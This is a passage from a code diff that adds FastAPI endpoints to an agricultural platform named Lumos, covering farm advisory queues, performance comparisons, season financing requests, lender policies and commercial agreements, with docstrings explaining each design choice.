+        "releases": "https://www.ams.usda.gov/datasets/pdp/pdpdata",
+    }
+
+
+# ==================================================================== #
+# Farm intelligence, the advisory queue, and performance               #
+# ==================================================================== #
+def _weather_risk_for(farm) -> dict | None:
+    """The existing weather surface, or None when it cannot answer.
+
+    Wrapped because the advisory queue must produce NO weather item when the
+    forecast is unavailable — an error here would otherwise take the whole queue
+    down, and a farm's conflicts matter more than its forecast.
+    """
+    try:
+        return default_weather_service.get_weather_risk(farm.location)
+    except Exception:  # pragma: no cover - defensive around an external service
+        return None
+
+
+@app.get("/farms/{farm_id}/advisory", tags=["advisory"])
+def get_farm_advisory(
+    farm_id: int, crop_cycle_id: int | None = None, db: Session = Depends(get_db)
+):
+    """The ranked list of what this farm should do next, and why.
+
+    Entirely derived: nothing is stored, and an item disappears as soon as the
+    record behind it moves. Selective by design — a gap becomes an item only when it
+    materially affects crop outcome, compliance, economics, follow-up verification,
+    procurement, or financing. The exhaustive list of what is unentered lives in the
+    season closeout's `completeness`, which is the right place for it.
+
+    Every item carries the recommendation, why, the evidence behind it, the urgency,
+    and one concrete next action. An economic consequence appears only where a
+    recorded baseline exists; otherwise it carries `not_calculated` and its reason.
+    """
+    farm = _require_farm(db, farm_id)
+    return crud.build_advisory_queue(
+        db, farm, crop_cycle_id, weather_risk=_weather_risk_for(farm)
+    )
+
+
+@app.get("/farms/{farm_id}/performance", tags=["advisory"])
+def get_farm_performance(farm_id: int, db: Session = Depends(get_db)):
+    """This farm's own seasons, compared against each other.
+
+    No overall score and no cross-farm benchmark — a blended figure across seasons
+    that differ in crop, area, weather and market is a claim nobody can check. A
+    trend appears only where the same metric computed in both seasons with matching
+    units, and refuses by name otherwise.
+    """
+    farm = _require_farm(db, farm_id)
+    return crud.build_farm_performance(db, farm)
+
+
+@app.get("/farms/{farm_id}/intelligence", tags=["advisory"])
+def get_farm_intelligence(
+    farm_id: int, crop_cycle_id: int | None = None, db: Session = Depends(get_db)
+):
+    """Everything the farm page needs, in one call: state, advice, economics, value.
+
+    Composition only — each block is the same builder its own endpoint serves, so
+    the overview and the detail pages cannot tell different stories.
+
+    Carries NO disease-risk assessment. The Botrytis study is blinded and a shadow
+    row reaching a PCA-facing surface ends the measurement (ENGINEERING_GUIDELINES.md §5).
+    """
+    farm = _require_farm(db, farm_id)
+    if crop_cycle_id is not None:
+        cycle = _require_crop_cycle(db, crop_cycle_id)
+        if cycle.farm_id != farm_id:
+            raise HTTPException(
+                status_code=404, detail="That crop cycle belongs to a different farm"
+            )
+    return crud.build_farm_intelligence(
+        db, farm, crop_cycle_id, weather_risk=_weather_risk_for(farm)
+    )
+
+
+@app.post("/farms/{farm_id}/advisory/explain", tags=["advisory"])
+def explain_advisory_item(
+    farm_id: int, body: dict, db: Session = Depends(get_db)
+):
+    """A retrieval-grounded explanation of ONE queue item, on demand.
+
+    Opt-in, never on load: the queue itself is deterministic and works with no API
+    key, and the demo must not depend on one. The AI explains the evidence already
+    on the item — it does not set the urgency, choose the next action, name a
+    product, or decide anything. Every call is logged as an `AiJudgment`.
+    """
+    farm = _require_farm(db, farm_id)
+    item_key = (body or {}).get("item_key")
+    if not item_key:
+        raise HTTPException(status_code=422, detail="item_key is required")
+
+    queue = crud.build_advisory_queue(
+        db, farm, (body or {}).get("crop_cycle_id"),
+        weather_risk=_weather_risk_for(farm),
+    )
+    item = next((i for i in queue["items"] if i["item_key"] == item_key), None)
+    if item is None:
+        raise HTTPException(
+            status_code=404,
+            detail="That advisory item is no longer in the queue — it may be resolved.",
+        )
+    return crud.explain_advisory_item(db, farm, item)
+
+
+# ==================================================================== #
+# Season financing                                                     #
+# ==================================================================== #
+def _require_financing_request(db: Session, request_id: int):
+    request = crud.get_financing_request(db, request_id)
+    if request is None:
+        raise HTTPException(status_code=404, detail="Financing request not found")
+    return request
+
+
+@app.post(
+    "/farms/{farm_id}/financing-requests",
+    response_model=schemas.FinancingRequest, status_code=201, tags=["financing"],
+)
+def post_financing_request(
+    farm_id: int, data: schemas.FinancingRequestCreate, db: Session = Depends(get_db)
+):
+    """Open a financing request for a season or a defined need.
+
+    Not an application with an outcome: Lumos assembles the evidence and records the
+    indicative terms that come back. There is no `approved` status because the credit
+    decision is the lender's, and Lumos never makes one.
+    """
+    farm = _require_farm(db, farm_id)
+    return crud.create_financing_request(db, farm, data)
+
+
+@app.get(
+    "/farms/{farm_id}/financing-requests",
+    response_model=list[schemas.FinancingRequest], tags=["financing"],
+)
+def get_financing_requests(farm_id: int, db: Session = Depends(get_db)):
+    _require_farm(db, farm_id)
+    return crud.list_financing_requests(db, farm_id)
+
+
+@app.get(
+    "/financing-requests/{request_id}",
+    response_model=schemas.FinancingRequest, tags=["financing"],
+)
+def get_financing_request(request_id: int, db: Session = Depends(get_db)):
+    return _require_financing_request(db, request_id)
+
+
+@app.patch(
+    "/financing-requests/{request_id}",
+    response_model=schemas.FinancingRequest, tags=["financing"],
+)
+def patch_financing_request(
+    request_id: int, data: schemas.FinancingRequestUpdate,
+    db: Session = Depends(get_db),
+):
+    request = _require_financing_request(db, request_id)
+    if data.lender_policy_id is not None:
+        request.lender_policy_id = data.lender_policy_id
+    if data.requested_amount is not None:
+        request.requested_amount = data.requested_amount
+    if data.notes is not None:
+        request.notes = data.notes
+    if data.status is not None:
+        return crud.update_financing_request_status(
+            db, request, data.status, actor=data.actor
+        )
+    db.commit()
+    db.refresh(request)
+    return request
+
+
+@app.get("/financing-requests/{request_id}/evidence-package", tags=["financing"])
+def get_financing_evidence_package(request_id: int, db: Session = Depends(get_db)):
+    """Everything a lender typically asks for, and whether this farm has it.
+
+    A checklist of records, not a credit opinion. There is no score, no approval
+    likelihood, and no rate — those are the lender's to form, and Lumos has no policy
+    to form them with. What it can say honestly is what is on record and what is not.
+
+    This is the product insight made visible: the same operational data that lets
+    Lumos advise the grower is what makes the farm legible to credit.
+    """
+    request = _require_financing_request(db, request_id)
+    return crud.build_financing_package(db, request)
+
+
+@app.get("/financing-requests/{request_id}/assessment", tags=["financing"])
+def get_financing_assessment(request_id: int, db: Session = Depends(get_db)):
+    """This farm's recorded evidence read against the attached lender's own criteria.
+
+    Refuses when no policy is attached. The strongest affirmative outcome is
+    `conditions_met` — a statement about the policy, never a commitment to lend —
+    and a rule that could not be evaluated routes to `referred_to_human` rather than
+    being folded into a pass.
+    """
+    request = _require_financing_request(db, request_id)
+    return crud.assess_financing_request(db, request)
+
+
+@app.get("/financing-requests/{request_id}/monitoring", tags=["financing"])
+def get_financing_monitoring(request_id: int, db: Session = Depends(get_db)):
+    """Covenant standing for a financed season, from the same operational features.
+
+    The same records that drive the advisory queue drive this. A covenant whose
+    feature could not be computed is NOT EVALUATED, never `within` — nothing checked
+    is not the same as compliant.
+    """
+    request = _require_financing_request(db, request_id)
+    return crud.monitor_financing_request(db, request)
+
+
+@app.post(
+    "/internal/financing-requests/{request_id}/offers",
+    response_model=schemas.FinancingOffer, status_code=201, tags=["internal"],
+)
+def internal_post_financing_request_offer(
+    request_id: int, data: schemas.FinancingOfferCreate,
+    db: Session = Depends(get_db),
+):
+    """Concierge-enter a lender's indicative terms against a season request.
+
+    Operator-gated by the `/internal` path prefix, exactly like supplier quotes: a
+    lender's terms arrive by email and a human transcribes them. Every figure is the
+    lender's own; Lumos computes no rate and no repayment.
+    """
+    request = _require_financing_request(db, request_id)
+    return crud.create_financing_offer_for_request(db, request, data)
+
+
+@app.post(
+    "/internal/lender-policies",
+    response_model=schemas.LenderPolicy, status_code=201, tags=["internal"],
+)
+def internal_post_lender_policy(
+    data: schemas.LenderPolicyCreate, db: Session = Depends(get_db)
+):
+    """Record a lending partner's WRITTEN criteria, with its source document.
+
+    Operator-gated, and `source_document` is required: a threshold with no stated
+    origin is indistinguishable from one Lumos invented, and a Lumos-authored credit
+    policy is forbidden (ENGINEERING_GUIDELINES.md §4). Lumos evaluates a lender's policy; it never
+    writes one.
+    """
+    return crud.create_lender_policy(db, data)
+
+
+@app.get(
+    "/lender-policies", response_model=list[schemas.LenderPolicy], tags=["financing"],
+)
+def get_lender_policies(db: Session = Depends(get_db)):
+    """Policies on record, so a grower can see which criteria they are read against."""
+    return crud.list_lender_policies(db)
+
+
+# ==================================================================== #
+# Commercial agreements and Lumos economic participation               #
+# ==================================================================== #
+@app.post(
+    "/internal/farms/{farm_id}/commercial-agreements",
+    response_model=schemas.CommercialAgreement, status_code=201, tags=["internal"],
+)
+def internal_post_commercial_agreement(
+    farm_id: int, data: schemas.CommercialAgreementCreate,
+    db: Session = Depends(get_db),
+):
+    """Record what Lumos and this farm agreed Lumos is paid, and on what basis.
+
+    Operator-gated because a commercial term is a negotiated act, not something a
+    grower sets in a form. Append-only: renegotiating supersedes rather than edits,
+    so the figure a past season was calculated under stays reproducible.
+    """
+    farm = _require_farm(db, farm_id)
+    return crud.create_commercial_agreement(db, farm, data)
+
+
+@app.get(
+    "/farms/{farm_id}/commercial-agreements",
+    response_model=list[schemas.CommercialAgreement], tags=["value"],
+)
+def get_commercial_agreements(farm_id: int, db: Session = Depends(get_db)):
+    """Grower-facing on purpose: a farm can always read its own commercial terms."""
+    _require_farm(db, farm_id)
+    return crud.list_commercial_agreements(db, farm_id)
+
+
+@app.get("/crop-cycles/{cycle_id}/participation", tags=["value"])
+def get_crop_cycle_participation(cycle_id: int, db: Session = Depends(get_db)):
+    """What the agreed commercial model comes to on this season's recorded evidence.
+
+    Accounting, not billing. This is a calculated figure — there is no invoice, no
+    due date, no balance, and no payment anywhere downstream, and
+    `participation.Participation` has no field that could carry one.
+
+    A share of verified value reads the VERIFIED tier only: charging against
+    estimated value would bill for a claim nobody has corroborated. With no verified
+    value the answer is a refusal naming that, never a share of zero.
+    """
+    cycle = _require_crop_cycle(db, cycle_id)
+    return crud.compute_participation(db, cycle)
